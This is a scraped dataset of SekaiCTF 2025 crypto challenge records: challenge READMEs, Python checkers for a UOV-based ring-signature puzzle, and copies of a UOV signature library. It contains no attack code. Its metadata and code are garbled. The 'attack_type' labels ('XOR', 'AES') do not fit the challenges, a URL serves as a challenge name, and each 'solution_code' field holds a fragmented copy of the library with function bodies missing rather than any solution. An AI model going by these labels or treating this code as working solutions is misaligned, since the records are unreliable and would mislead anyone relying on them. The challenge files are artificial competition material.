{"id": "project-sekai_sekaictf-2025_Law_and_Order", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "Law and Order", "attack_type": "Unknown", "writeup": "## Law and Order\n\n| Author    | Difficulty  | Points | Solves |\n| --------- | ----------- | ------ | ------ |\n| deuterium | 4⯁ (Expert) | 500    | 0      |\n\n---\n\n> [!IMPORTANT]\n> Due to a deployment error, the file in `dist/` is an incorrect version that was accidentally released during SekaiCTF 2025. The source and solution here are for the correct version. A bounty was placed for solving the version in `dist/`.\n\n### Description\n\n<blockquote>\n\nMy friends were the FROST to implement sharing signatures for flag and ensured to always include me but somehow it's still not working?\n\n<https://ctf.sekai.team/launcher/>\n\n> ❖ **Note**  \n> First solver gets a $50 bounty :)\n\n</blockquote>\n\n### Challenge Files\n\n- [chall.py](dist)\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\law-and-order\\README.md", "file_size": 729, "scraped_at": "2025-10-26T18:19:39.415927"}
{"id": "project-sekai_sekaictf-2025_SSSS", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "SSSS", "attack_type": "Unknown", "writeup": "## SSSS\n\n| Author | Difficulty | Points | Solves | First Blood | Time to Blood |\n| ------ | ---------- | ------ | ------ | ----------- | ------------- |\n| Utaha  | 1⯁ (Easy)  | 100    | 236    | UniverSea   | 6 minutes     |\n\n---\n\n### Description\n\n<blockquote>\n\nShamir SendS the Secret to everyone\n\n`ncat --ssl ssss.chals.sekai.team 1337`\n\n</blockquote>\n\n### Challenge Files\n\n- [chall.py](dist)\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\ssss\\README.md", "file_size": 395, "scraped_at": "2025-10-26T18:19:39.425716"}
{"id": "project-sekai_sekaictf-2025_unfairy-ring", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "unfairy-ring", "attack_type": "Unknown", "writeup": "## unfairy-ring\n\n| Author          | Difficulty  | Points | Solves |\n| --------------- | ----------- | ------ | ------ |\n| Neobeo, Sceleri | 6✦ (Append) | 500    | 0      |\n\n---\n\n### Description\n\nTags: `Bounty`, `SEKAI`\n\n<blockquote>\n\nThis is a revenge challenge of [fairy-ring](https://github.com/defund/ctf/tree/master/dicectf-quals-2025/fairy-ring) from DiceCTF Quals 2025.\n\nBy popular vote, the best anime girl of all time is Mai from Bunny Girl Senpai, so we've included her here to give you some extra help.\n\n<https://ctf.sekai.team/launcher/>\n\n> ❖ **Note**  \n> First solver gets a $100 bounty :)\n\n</blockquote>\n\n### Challenge Files\n\n- [chall.py](dist)\n- [uov.py](dist)\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\unfairy-ring\\README.md", "file_size": 676, "scraped_at": "2025-10-26T18:19:39.438856"}
{"id": "project-sekai_sekaictf-2025_unfairy-ring++", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "unfairy-ring++", "attack_type": "Unknown", "writeup": "## unfairy-ring++\n\n| Author          | Difficulty  | Points | Solves |\n| --------------- | ----------- | ------ | ------ |\n| Sceleri, Neobeo | 6✦ (Append) | 500    | 0      |\n\n---\n\n### Description\n\nTags: `0day`, `Bounty`, `SEKAI`\n\n<blockquote>\n\nThis is a revenge challenge of [fairy-ring](https://github.com/defund/ctf/tree/master/dicectf-quals-2025/fairy-ring) from DiceCTF Quals 2025.\n\nSix fairies, just like the original. No more Mai to help you.\n\n<https://ctf.sekai.team/launcher/>\n\n> ❖ **Note**  \n> First solver gets a $200 bounty :)\n\n</blockquote>\n\n### Challenge Files\n\n- [chall.py](dist)\n- [uov.py](dist)\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\unfairy-ring-plusplus\\README.md", "file_size": 612, "scraped_at": "2025-10-26T18:19:39.452275"}
{"id": "project-sekai_sekaictf-2025_https:__github.com_mjosaarinen_uov-py_blob_main_uov.py", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "https://github.com/mjosaarinen/uov-py/blob/main/uov.py", "attack_type": "XOR", "writeup": "from functools import reduce\nfrom uov import uov_1p_pkc as uov # https://github.com/mjosaarinen/uov-py/blob/main/uov.py\nimport os\nFLAG = os.getenv(\"FLAG\", \"SEKAI{TESTFLAG}\")\n\ndef xor(a, b):\n    assert len(a) == len(b), \"XOR inputs must be of the same length\"\n    return bytes(x ^ y for x, y in zip(a, b))\n\nnames = ['Miku', 'Ichika', 'Minori', 'Kohane', 'Tsukasa', 'Kanade']\npks = [uov.expand_pk(uov.shake256(name.encode(), 43576)) for name in names]\nmsg = b'SEKAI'\n\nsig = bytes.fromhex(input('Ring signature (hex): '))\nassert len(sig) == 112 * len(names), 'Incorrect signature length'\n\nt = reduce(xor, [uov.pubmap(sig[i*112:(i+1)*112], pks[i]) for i in range(len(names))])\nassert t == uov.shake256(msg, 44), 'Invalid signature'\n\nprint(FLAG)", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\unfairy-ring-plusplus\\dist\\chall.py", "file_size": 740, "scraped_at": "2025-10-26T18:19:39.466240"}
{"id": "project-sekai_sekaictf-2025_uov.py", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "uov.py", "attack_type": "AES", "writeup": "#   uov.py\n#   2024-04-24  Markku-Juhani O. Saarinen <mjos@iki.fi>. See LICENSE\n\n#   === Implementation of UOV 1.0 ===\n\nfrom Crypto.Cipher import AES\nfrom Crypto.Hash import SHAKE256\nimport os\n\nclass UOV:\n\n    #   initialize\n    def __init__(self, gf=256, n=112, m=44, pkc=False, skc=False, name='',\n                        rbg=os.urandom):\n        \"\"\" Initialize the class with UOV parameters. \"\"\"\n        self.gf     =   gf                  #   _GFSIZE\n        self.n      =   n                   #   _PUB_N\n        self.m      =   m                   #   _PUB_M\n        self.v      =   n - m               #   _V\n        self.pkc    =   pkc                 #   public key compression\n        self.skc    =   skc                 #   secret key compression\n        self.name   =   name                #   spec name\n        self.rbg    =   rbg                 #   randombytes() callback\n\n        if pkc:                             #   variant names as in KAT files\n            kc = 'pkc'                      #   spec uses pkc/skc, KAT cpk/csk\n        else:\n            kc = 'classic'\n        if skc:\n            kc += '-skc'\n        self.katname    =   f'OV({gf},{n},{m})-{kc}'\n\n        if self.gf == 256:                  #   two kinds of Finite fields\n            self.gf_bits    =   8\n            self.gf_mul     =   self.gf256_mul\n            self.gf_mulm    =   self.gf256_mulm\n        elif self.gf == 16:\n            self.gf_bits    =   4\n            self.gf_mul     =   self.gf16_mul\n            self.gf_mulm    =   self.gf16_mulm\n        else:\n            raise   ValueError\n\n        self.v_sz   =   self.gf_bits * self.v // 8  #   _V_BYTE\n        self.n_sz   =   self.gf_bits * self.n // 8  #   _PUB_N_BYTE\n        self.m_sz   =   self.gf_bits * self.m // 8  #   _PUB_M_BYTE, _O_BYTE\n\n        self.seed_sk_sz =   32              #   LEN_SKSEED\n        self.seed_pk_sz =   16              #   LEN_PKSEED\n        self.salt_sz    =   16              #   _SALT_BYTE\n\n        #   bit mask for \"mulm\" multipliers\n        mm = 0\n        for i in range(self.m):\n            mm = self.gf * mm + (self.gf >> 1)\n        self.mm     = mm\n\n        #   external sizes\n        def triangle(n):\n            return n * (n + 1) // 2\n        self.sig_sz =   self.n_sz + self.salt_sz        #   OV_SIGNATUREBYTES\n        self.so_sz  =   self.m * self.v_sz              #\n\n        self.p1_sz  =   self.m_sz * triangle(self.v)    #   _PK_P1_BYTE\n        self.p2_sz  =   self.m_sz * self.v * self.m     #   _PK_P2_BYTE\n        self.p3_sz  =   self.m_sz * triangle(self.m)    #   _PK_P3_BYTE\n\n        if  self.pkc:\n            self.pk_sz  =   self.seed_pk_sz + self.p3_sz            #   |cpk|\n        else:\n            self.pk_sz  =   self.p1_sz + self.p2_sz + self.p3_sz    #   |epk|\n\n        if  self.skc:\n            self.sk_sz  =   self.seed_sk_sz                         #   |csk|\n        else:\n            self.sk_sz  =   (   self.seed_sk_sz + self.so_sz +      #   |esk|\n                                self.p1_sz  +   self.p2_sz  )\n\n    #   random & symmetric crypto hooks\n\n    def set_random(self, rbg):\n        \"\"\" Set the key material RBG.\"\"\"\n        self.rbg        =   rbg\n\n    def shake256(self, x, l):\n        \"\"\" shake256s(x, l): Internal hook.\"\"\"\n        return SHAKE256.new(x).read(l)\n\n    def aes128ctr(self, key, l, ctr=0):\n        \"\"\" aes128ctr(key, l): Internal hook.\"\"\"\n        iv      =   b'\\x00' * 12\n        aes     =   AES.new(key, AES.MODE_CTR, nonce=iv, initial_value=ctr)\n        return  aes.encrypt(b'\\x00' * l)\n\n    #   basic finite field arithmetic\n\n    def gf16_mul(self, a, b):\n        \"\"\" GF(16) multiply: a*b mod (x^4 + x + 1). \"\"\"\n        r = a & (-(b & 1))\n        for i in range(1, 4):\n            t = a & 8\n            a = ((a ^ t) << 1) ^ (t >> 2) ^ (t >> 3)\n            r ^= a & (-((b >> i) & 1))\n        return r\n\n    def gf16_mulm(self, v, a):\n        \"\"\" Vector (length m) * scalar multiply in GF(16). \"\"\"\n        r = v & (-(a & 1))\n        for i in range(1, 4):\n            t = v & self.mm\n            v = ((v ^ t) << 1) ^ (t >> 3) ^ (t >> 2)\n            if (a >> i) & 1:\n                r ^= v\n        return r\n\n    def gf256_mul(self, a, b):\n        \"\"\" GF(256) multiply: a*b mod (x^8 + x^4 + x^3 + x + 1). \"\"\"\n        r = a & (-(b & 1));\n        for i in range(1, 8):\n            a = (a << 1) ^ ((-(a >> 7)) & 0x11B);\n            r ^= a & (-((b >> i) & 1));\n        return r\n\n    def gf256_mulm(self, v, a):\n        \"\"\" Vector (length m) * scalar multiply in GF(256). \"\"\"\n        r = v & (-(a & 1))\n        for i in range(1, 8):\n            t = v & self.mm\n            v = ((v ^ t) << 1) ^ (t >> 7) ^ (t >> 6) ^ (t >> 4) ^ (t >> 3)\n            if (a >> i) & 1:\n                r ^= v\n        return r\n\n    def gf_inv(self, a):\n        \"\"\" GF multiplicative inverse: a^-1.\"\"\"\n        r = a       #   computes 2^14 or a^254 == a^-1\n        for _ in range(2, self.gf_bits):\n            a = self.gf_mul(a, a)\n            r = self.gf_mul(r, a)\n        r = self.gf_mul(", "solution_code": "    #   initialize\n    def __init__(self, gf=256, n=112, m=44, pkc=False, skc=False, name='',\n                        rbg=os.urandom):\n        \"\"\" Initialize the class with UOV parameters. \"\"\"\n        self.gf     =   gf                  #   _GFSIZE\n        self.n      =   n                   #   _PUB_N\n        self.m      =   m                   #   _PUB_M\n        self.v      =   n - m               #   _V\n        self.pkc    =   pkc                 #   public key compression\n        self.skc    =   skc                 #   secret key compression\n        self.name   =   name                #   spec name\n        self.rbg    =   rbg                 #   randombytes() callback\n\n\n        #   external sizes\n        def triangle(n):\n            return n * (n + 1) // 2\n        self.sig_sz =   self.n_sz + self.salt_sz        #   OV_SIGNATUREBYTES\n        self.so_sz  =   self.m * self.v_sz              #\n\n\n    def set_random(self, rbg):\n        \"\"\" Set the key material RBG.\"\"\"\n        self.rbg        =   rbg\n\n\n    def shake256(self, x, l):\n        \"\"\" shake256s(x, l): Internal hook.\"\"\"\n        return SHAKE256.new(x).read(l)\n\n\n    def aes128ctr(self, key, l, ctr=0):\n        \"\"\" aes128ctr(key, l): Internal hook.\"\"\"\n        iv      =   b'\\x00' * 12\n        aes     =   AES.new(key, AES.MODE_CTR, nonce=iv, initial_value=ctr)\n        return  aes.encrypt(b'\\x00' * l)\n\n\n    def gf16_mul(self, a, b):\n        \"\"\" GF(16) multiply: a*b mod (x^4 + x + 1). \"\"\"\n        r = a & (-(b & 1))\n        for i in range(1, 4):\n            t = a & 8\n            a = ((a ^ t) << 1) ^ (t >> 2) ^ (t >> 3)\n            r ^= a & (-((b >> i) & 1))\n        return r\n\n\n    def gf16_mulm(self, v, a):\n        \"\"\" Vector (length m) * scalar multiply in GF(16). \"\"\"\n        r = v & (-(a & 1))\n        for i in range(1, 4):\n            t = v & self.mm\n            v = ((v ^ t) << 1) ^ (t >> 3) ^ (t >> 2)\n            if (a >> i) & 1:\n                r ^= v\n        return r\n\n\n    def gf256_mul(self, a, b):\n        \"\"\" GF(256) multiply: a*b mod (x^8 + x^4 + x^3 + x + 1). \"\"\"\n        r = a & (-(b & 1));\n        for i in range(1, 8):\n            a = (a << 1) ^ ((-(a >> 7)) & 0x11B);\n            r ^= a & (-((b >> i) & 1));\n        return r\n\n\n    def gf256_mulm(self, v, a):\n        \"\"\" Vector (length m) * scalar multiply in GF(256). \"\"\"\n        r = v & (-(a & 1))\n        for i in range(1, 8):\n            t = v & self.mm\n            v = ((v ^ t) << 1) ^ (t >> 7) ^ (t >> 6) ^ (t >> 4) ^ (t >> 3)\n            if (a >> i) & 1:\n                r ^= v\n        return r\n\n\n    def gf_inv(self, a):\n        \"\"\" GF multiplicative inverse: a^-1.\"\"\"\n        r = a       #   computes 2^14 or a^254 == a^-1\n        for _ in range(2, self.gf_bits):\n            a = self.gf_mul(a, a)\n            r = self.gf_mul(r, a)\n        r = self.gf_mul(r, r)\n        return r\n\n\n    def gf_pack(self, v):\n        \"\"\" Pack a vector of GF elements into bytes. \"\"\"\n        if self.gf == 256:\n            return bytes(v)\n        elif self.gf == 16:\n            return bytes( [ v[i] + (v[i + 1] << 4) for\n                                i in range(0, len(v), 2) ] )\n\n\n    def gf_unpack(self, b):\n        \"\"\" Unpack bytes into a vector of GF elements \"\"\"\n        if self.gf == 256:\n            return bytearray(b)\n        elif self.gf == 16:\n            v = []\n            for x in b:\n                v += [ x & 0xF, x >> 4 ]\n            return bytearray(v)\n\n\n    def unpack_mtri(self, b, d):\n        \"\"\" Unpack an (upper) triangular matrix.\"\"\"\n        m = [ [ 0 ] * d for i in range(d) ]\n        p = 0\n        for i in range(d):\n            for j in range(i, d):\n                m[i][j] = int.from_bytes( b[ p : p + self.m_sz ] )\n                p += self.m_sz\n        return m\n\n\n    def pack_mtri(self, m, d):\n        \"\"\" Pack an upper triangular matrix.\"\"\"\n        b = b''\n        for i in range(d):\n            for j in range(i, d):\n                t = m[i][j]\n                b += t.to_bytes(self.m_sz)\n        return b\n\n\n    def unpack_mrect(self, b, h, w):\n        \"\"\" Unpack a rectangular matrix.\"\"\"\n        m = [ [ 0 ] * w for i in range(h) ]\n        p = 0\n        for i in range(h):\n            for j in range(w):\n                m[i][j] = int.from_bytes( b[ p : p + self.m_sz ] )\n                p += self.m_sz\n        return m\n\n\n    def pack_mrect(self, m, h, w):\n        \"\"\" Pack a rectangular matrix.\"\"\"\n        b = b''\n        for i in range(h):\n            for j in range(w):\n                b += m[i][j].to_bytes(self.m_sz)\n        return b\n\n\n    def unpack_rect(self, b, h, w):\n        \"\"\" Unpack a rectangular matrix.\"\"\"\n        if self.gf == 256:\n            m = [ b[i : i + w] for i in range(0, h * w, w) ]\n        elif self.gf == 16:\n            w_sz = w // 2\n            m = [   self.gf_unpack(b[i : i + w_sz])\n                        for i in range(0, h * w_sz, w_sz) ]\n        return m\n\n\n    def calc_f2_p3(self, p1, p2, so):\n\n\n    def gauss_solve(self, l, c):\n        \"\"\" Solve a system of linear equations in GF.\"\"\"\n\n\n    def pubmap(self, z, tm):\n        \"\"\" Apply public map to z.\"\"\"\n        v   = self.v\n        m   = self.m\n\n\n    def expand_p(self, seed_pk):\n        \"\"\" UOV.ExpandP(). \"\"\"\n        pk          =   self.aes128ctr(seed_pk, self.p1_sz + self.p2_sz);\n        return          (pk[0:self.p1_sz], pk[self.p1_sz:])\n\n\n    def expand_pk(self, cpk):\n        \"\"\" UOV.ExpandPK(cpk). \"\"\"\n        seed_pk     =   cpk[:self.seed_pk_sz]\n        p3          =   cpk[self.seed_pk_sz:]\n        (p1, p2)    =   self.expand_p(seed_pk)\n        epk         =   p1 + p2 + p3\n        return      epk\n\n\n    def expand_sk(self, csk):\n        \"\"\" UOV.ExpandSK(csk). \"\"\"\n        seed_sk     =   csk[:self.seed_sk_sz]\n        seed_pk_so  =   self.shake256(seed_sk, self.seed_pk_sz + self.so_sz)\n        seed_pk     =   seed_pk_so[:self.seed_pk_sz]\n        so          =   seed_pk_so[self.seed_pk_sz:]\n        (p1, p2)    =   self.expand_p(seed_pk)\n        (sks, p3)   =   self.calc_f2_p3(p1, p2, so)\n        esk         =   seed_sk + so + p1 + sks\n        return      esk\n\n\n    def keygen(self):\n        \"\"\" UOV.classic.KeyGen(). \"\"\"\n\n\n    def sign(self, msg, sk):\n        \"\"\" UOV.Sign().\"\"\"\n\n\n        #   y = O * x\n        y = bytearray(v)        #   subtract from v\n        for i in range(self.m):\n            for j in range(self.v):\n                y[j] ^= self.gf_mul(mo[i][j], x[i])\n\n\n    def verify(self, sig, msg, pk):\n        \"\"\" UOV.Verify() and UOV.pkc.Verify(). Return boolean if valid. \"\"\"\n\n\n    def open(self, sm, pk):\n        \"\"\" Verify a signed message  sm = msg + sig. Return msg or None. \"\"\"\n        msg_sz  =   len(sm) - self.sig_sz\n        msg     =   sm[:msg_sz]\n        sig     =   sm[msg_sz:]\n        if not self.verify(sig, msg, pk):\n            return None\n        return msg\n", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\unfairy-ring-plusplus\\dist\\uov.py", "file_size": 17067, "scraped_at": "2025-10-26T18:19:39.487773"}
{"id": "project-sekai_sekaictf-2025_https:__github.com_mjosaarinen_uov-py_blob_main_uov.py", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "https://github.com/mjosaarinen/uov-py/blob/main/uov.py", "attack_type": "XOR", "writeup": "from functools import reduce\nfrom uov import uov_1p_pkc as uov # https://github.com/mjosaarinen/uov-py/blob/main/uov.py\nimport os\nFLAG = os.getenv(\"FLAG\", \"SEKAI{TESTFLAG}\")\n\ndef xor(a, b):\n    assert len(a) == len(b), \"XOR inputs must be of the same length\"\n    return bytes(x ^ y for x, y in zip(a, b))\n\nnames = ['Miku', 'Ichika', 'Minori', 'Kohane', 'Tsukasa', 'Kanade', 'Mai']\npks = [uov.expand_pk(uov.shake256(name.encode(), 43576)) for name in names]\nmsg = b'SEKAI'\n\nsig = bytes.fromhex(input('Ring signature (hex): '))\nassert len(sig) == 112 * len(names), 'Incorrect signature length'\n\nt = reduce(xor, [uov.pubmap(sig[i*112:(i+1)*112], pks[i]) for i in range(len(names))])\nassert t == uov.shake256(msg, 44), 'Invalid signature'\n\nprint(FLAG)", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\unfairy-ring\\dist\\chall.py", "file_size": 747, "scraped_at": "2025-10-26T18:19:39.500919"}
{"id": "project-sekai_sekaictf-2025_uov.py", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "uov.py", "attack_type": "AES", "writeup": "#   uov.py\n#   2024-04-24  Markku-Juhani O. Saarinen <mjos@iki.fi>. See LICENSE\n\n#   === Implementation of UOV 1.0 ===\n\nfrom Crypto.Cipher import AES\nfrom Crypto.Hash import SHAKE256\nimport os\n\nclass UOV:\n\n    #   initialize\n    def __init__(self, gf=256, n=112, m=44, pkc=False, skc=False, name='',\n                        rbg=os.urandom):\n        \"\"\" Initialize the class with UOV parameters. \"\"\"\n        self.gf     =   gf                  #   _GFSIZE\n        self.n      =   n                   #   _PUB_N\n        self.m      =   m                   #   _PUB_M\n        self.v      =   n - m               #   _V\n        self.pkc    =   pkc                 #   public key compression\n        self.skc    =   skc                 #   secret key compression\n        self.name   =   name                #   spec name\n        self.rbg    =   rbg                 #   randombytes() callback\n\n        if pkc:                             #   variant names as in KAT files\n            kc = 'pkc'                      #   spec uses pkc/skc, KAT cpk/csk\n        else:\n            kc = 'classic'\n        if skc:\n            kc += '-skc'\n        self.katname    =   f'OV({gf},{n},{m})-{kc}'\n\n        if self.gf == 256:                  #   two kinds of Finite fields\n            self.gf_bits    =   8\n            self.gf_mul     =   self.gf256_mul\n            self.gf_mulm    =   self.gf256_mulm\n        elif self.gf == 16:\n            self.gf_bits    =   4\n            self.gf_mul     =   self.gf16_mul\n            self.gf_mulm    =   self.gf16_mulm\n        else:\n            raise   ValueError\n\n        self.v_sz   =   self.gf_bits * self.v // 8  #   _V_BYTE\n        self.n_sz   =   self.gf_bits * self.n // 8  #   _PUB_N_BYTE\n        self.m_sz   =   self.gf_bits * self.m // 8  #   _PUB_M_BYTE, _O_BYTE\n\n        self.seed_sk_sz =   32              #   LEN_SKSEED\n        self.seed_pk_sz =   16              #   LEN_PKSEED\n        self.salt_sz    =   16              #   _SALT_BYTE\n\n        #   bit mask for \"mulm\" multipliers\n        mm = 0\n        for i in range(self.m):\n            mm = self.gf * mm + (self.gf >> 1)\n        self.mm     = mm\n\n        #   external sizes\n        def triangle(n):\n            return n * (n + 1) // 2\n        self.sig_sz =   self.n_sz + self.salt_sz        #   OV_SIGNATUREBYTES\n        self.so_sz  =   self.m * self.v_sz              #\n\n        self.p1_sz  =   self.m_sz * triangle(self.v)    #   _PK_P1_BYTE\n        self.p2_sz  =   self.m_sz * self.v * self.m     #   _PK_P2_BYTE\n        self.p3_sz  =   self.m_sz * triangle(self.m)    #   _PK_P3_BYTE\n\n        if  self.pkc:\n            self.pk_sz  =   self.seed_pk_sz + self.p3_sz            #   |cpk|\n        else:\n            self.pk_sz  =   self.p1_sz + self.p2_sz + self.p3_sz    #   |epk|\n\n        if  self.skc:\n            self.sk_sz  =   self.seed_sk_sz                         #   |csk|\n        else:\n            self.sk_sz  =   (   self.seed_sk_sz + self.so_sz +      #   |esk|\n                                self.p1_sz  +   self.p2_sz  )\n\n    #   random & symmetric crypto hooks\n\n    def set_random(self, rbg):\n        \"\"\" Set the key material RBG.\"\"\"\n        self.rbg        =   rbg\n\n    def shake256(self, x, l):\n        \"\"\" shake256s(x, l): Internal hook.\"\"\"\n        return SHAKE256.new(x).read(l)\n\n    def aes128ctr(self, key, l, ctr=0):\n        \"\"\" aes128ctr(key, l): Internal hook.\"\"\"\n        iv      =   b'\\x00' * 12\n        aes     =   AES.new(key, AES.MODE_CTR, nonce=iv, initial_value=ctr)\n        return  aes.encrypt(b'\\x00' * l)\n\n    #   basic finite field arithmetic\n\n    def gf16_mul(self, a, b):\n        \"\"\" GF(16) multiply: a*b mod (x^4 + x + 1). \"\"\"\n        r = a & (-(b & 1))\n        for i in range(1, 4):\n            t = a & 8\n            a = ((a ^ t) << 1) ^ (t >> 2) ^ (t >> 3)\n            r ^= a & (-((b >> i) & 1))\n        return r\n\n    def gf16_mulm(self, v, a):\n        \"\"\" Vector (length m) * scalar multiply in GF(16). \"\"\"\n        r = v & (-(a & 1))\n        for i in range(1, 4):\n            t = v & self.mm\n            v = ((v ^ t) << 1) ^ (t >> 3) ^ (t >> 2)\n            if (a >> i) & 1:\n                r ^= v\n        return r\n\n    def gf256_mul(self, a, b):\n        \"\"\" GF(256) multiply: a*b mod (x^8 + x^4 + x^3 + x + 1). \"\"\"\n        r = a & (-(b & 1));\n        for i in range(1, 8):\n            a = (a << 1) ^ ((-(a >> 7)) & 0x11B);\n            r ^= a & (-((b >> i) & 1));\n        return r\n\n    def gf256_mulm(self, v, a):\n        \"\"\" Vector (length m) * scalar multiply in GF(256). \"\"\"\n        r = v & (-(a & 1))\n        for i in range(1, 8):\n            t = v & self.mm\n            v = ((v ^ t) << 1) ^ (t >> 7) ^ (t >> 6) ^ (t >> 4) ^ (t >> 3)\n            if (a >> i) & 1:\n                r ^= v\n        return r\n\n    def gf_inv(self, a):\n        \"\"\" GF multiplicative inverse: a^-1.\"\"\"\n        r = a       #   computes 2^14 or a^254 == a^-1\n        for _ in range(2, self.gf_bits):\n            a = self.gf_mul(a, a)\n            r = self.gf_mul(r, a)\n        r = self.gf_mul(", "solution_code": "    #   initialize\n    def __init__(self, gf=256, n=112, m=44, pkc=False, skc=False, name='',\n                        rbg=os.urandom):\n        \"\"\" Initialize the class with UOV parameters. \"\"\"\n        self.gf     =   gf                  #   _GFSIZE\n        self.n      =   n                   #   _PUB_N\n        self.m      =   m                   #   _PUB_M\n        self.v      =   n - m               #   _V\n        self.pkc    =   pkc                 #   public key compression\n        self.skc    =   skc                 #   secret key compression\n        self.name   =   name                #   spec name\n        self.rbg    =   rbg                 #   randombytes() callback\n\n\n        #   external sizes\n        def triangle(n):\n            return n * (n + 1) // 2\n        self.sig_sz =   self.n_sz + self.salt_sz        #   OV_SIGNATUREBYTES\n        self.so_sz  =   self.m * self.v_sz              #\n\n\n    def set_random(self, rbg):\n        \"\"\" Set the key material RBG.\"\"\"\n        self.rbg        =   rbg\n\n\n    def shake256(self, x, l):\n        \"\"\" shake256s(x, l): Internal hook.\"\"\"\n        return SHAKE256.new(x).read(l)\n\n\n    def aes128ctr(self, key, l, ctr=0):\n        \"\"\" aes128ctr(key, l): Internal hook.\"\"\"\n        iv      =   b'\\x00' * 12\n        aes     =   AES.new(key, AES.MODE_CTR, nonce=iv, initial_value=ctr)\n        return  aes.encrypt(b'\\x00' * l)\n\n\n    def gf16_mul(self, a, b):\n        \"\"\" GF(16) multiply: a*b mod (x^4 + x + 1). \"\"\"\n        r = a & (-(b & 1))\n        for i in range(1, 4):\n            t = a & 8\n            a = ((a ^ t) << 1) ^ (t >> 2) ^ (t >> 3)\n            r ^= a & (-((b >> i) & 1))\n        return r\n\n\n    def gf16_mulm(self, v, a):\n        \"\"\" Vector (length m) * scalar multiply in GF(16). \"\"\"\n        r = v & (-(a & 1))\n        for i in range(1, 4):\n            t = v & self.mm\n            v = ((v ^ t) << 1) ^ (t >> 3) ^ (t >> 2)\n            if (a >> i) & 1:\n                r ^= v\n        return r\n\n\n    def gf256_mul(self, a, b):\n        \"\"\" GF(256) multiply: a*b mod (x^8 + x^4 + x^3 + x + 1). \"\"\"\n        r = a & (-(b & 1));\n        for i in range(1, 8):\n            a = (a << 1) ^ ((-(a >> 7)) & 0x11B);\n            r ^= a & (-((b >> i) & 1));\n        return r\n\n\n    def gf256_mulm(self, v, a):\n        \"\"\" Vector (length m) * scalar multiply in GF(256). \"\"\"\n        r = v & (-(a & 1))\n        for i in range(1, 8):\n            t = v & self.mm\n            v = ((v ^ t) << 1) ^ (t >> 7) ^ (t >> 6) ^ (t >> 4) ^ (t >> 3)\n            if (a >> i) & 1:\n                r ^= v\n        return r\n\n\n    def gf_inv(self, a):\n        \"\"\" GF multiplicative inverse: a^-1.\"\"\"\n        r = a       #   computes 2^14 or a^254 == a^-1\n        for _ in range(2, self.gf_bits):\n            a = self.gf_mul(a, a)\n            r = self.gf_mul(r, a)\n        r = self.gf_mul(r, r)\n        return r\n\n\n    def gf_pack(self, v):\n        \"\"\" Pack a vector of GF elements into bytes. \"\"\"\n        if self.gf == 256:\n            return bytes(v)\n        elif self.gf == 16:\n            return bytes( [ v[i] + (v[i + 1] << 4) for\n                                i in range(0, len(v), 2) ] )\n\n\n    def gf_unpack(self, b):\n        \"\"\" Unpack bytes into a vector of GF elements \"\"\"\n        if self.gf == 256:\n            return bytearray(b)\n        elif self.gf == 16:\n            v = []\n            for x in b:\n                v += [ x & 0xF, x >> 4 ]\n            return bytearray(v)\n\n\n    def unpack_mtri(self, b, d):\n        \"\"\" Unpack an (upper) triangular matrix.\"\"\"\n        m = [ [ 0 ] * d for i in range(d) ]\n        p = 0\n        for i in range(d):\n            for j in range(i, d):\n                m[i][j] = int.from_bytes( b[ p : p + self.m_sz ] )\n                p += self.m_sz\n        return m\n\n\n    def pack_mtri(self, m, d):\n        \"\"\" Pack an upper triangular matrix.\"\"\"\n        b = b''\n        for i in range(d):\n            for j in range(i, d):\n                t = m[i][j]\n                b += t.to_bytes(self.m_sz)\n        return b\n\n\n    def unpack_mrect(self, b, h, w):\n        \"\"\" Unpack a rectangular matrix.\"\"\"\n        m = [ [ 0 ] * w for i in range(h) ]\n        p = 0\n        for i in range(h):\n            for j in range(w):\n                m[i][j] = int.from_bytes( b[ p : p + self.m_sz ] )\n                p += self.m_sz\n        return m\n\n\n    def pack_mrect(self, m, h, w):\n        \"\"\" Pack a rectangular matrix.\"\"\"\n        b = b''\n        for i in range(h):\n            for j in range(w):\n                b += m[i][j].to_bytes(self.m_sz)\n        return b\n\n\n    def unpack_rect(self, b, h, w):\n        \"\"\" Unpack a rectangular matrix.\"\"\"\n        if self.gf == 256:\n            m = [ b[i : i + w] for i in range(0, h * w, w) ]\n        elif self.gf == 16:\n            w_sz = w // 2\n            m = [   self.gf_unpack(b[i : i + w_sz])\n                        for i in range(0, h * w_sz, w_sz) ]\n        return m\n\n\n    def calc_f2_p3(self, p1, p2, so):\n\n\n    def gauss_solve(self, l, c):\n        \"\"\" Solve a system of linear equations in GF.\"\"\"\n\n\n    def pubmap(self, z, tm):\n        \"\"\" Apply public map to z.\"\"\"\n        v   = self.v\n        m   = self.m\n\n\n    def expand_p(self, seed_pk):\n        \"\"\" UOV.ExpandP(). \"\"\"\n        pk          =   self.aes128ctr(seed_pk, self.p1_sz + self.p2_sz);\n        return          (pk[0:self.p1_sz], pk[self.p1_sz:])\n\n\n    def expand_pk(self, cpk):\n        \"\"\" UOV.ExpandPK(cpk). \"\"\"\n        seed_pk     =   cpk[:self.seed_pk_sz]\n        p3          =   cpk[self.seed_pk_sz:]\n        (p1, p2)    =   self.expand_p(seed_pk)\n        epk         =   p1 + p2 + p3\n        return      epk\n\n\n    def expand_sk(self, csk):\n        \"\"\" UOV.ExpandSK(csk). \"\"\"\n        seed_sk     =   csk[:self.seed_sk_sz]\n        seed_pk_so  =   self.shake256(seed_sk, self.seed_pk_sz + self.so_sz)\n        seed_pk     =   seed_pk_so[:self.seed_pk_sz]\n        so          =   seed_pk_so[self.seed_pk_sz:]\n        (p1, p2)    =   self.expand_p(seed_pk)\n        (sks, p3)   =   self.calc_f2_p3(p1, p2, 